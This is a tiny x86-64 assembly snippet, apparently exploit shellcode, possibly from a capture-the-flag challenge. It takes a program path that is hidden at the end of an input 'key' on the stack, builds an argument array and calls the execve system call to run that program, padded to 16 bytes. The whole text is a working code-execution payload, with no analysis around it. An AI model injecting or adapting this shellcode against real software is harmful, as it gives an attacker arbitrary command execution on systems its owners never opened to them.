use64

; Load path to execute from key.
; The key is in rsp+0x10, and we store the file
; to execute in the end of the key.
lea rdi, [rsp + 0x19]

cdq
push rdx
push rdi

;mov rsi, rsp
push rsp
pop rsi

;Perform the execve syscall
push 0x3b
pop rax
syscall

;pad to 16 bytes
nop